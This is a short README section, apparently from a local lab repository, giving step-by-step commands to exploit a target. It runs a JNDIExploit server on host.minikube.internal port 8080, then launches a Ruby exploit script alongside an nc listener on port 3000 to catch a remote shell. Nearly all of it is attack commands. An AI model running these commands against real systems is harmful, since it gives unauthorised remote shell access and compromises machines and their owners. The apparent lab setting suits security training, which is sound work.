
Once you've done the setup in the readme_original

## how to exploit 
launch this command with the file present in the exploit/ folder
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i host.minikube.internal -p 8080
```

then launch this command 

```
ruby ./script/exploit.rb & nc -lv 3000
```


you should get a shell on the machine
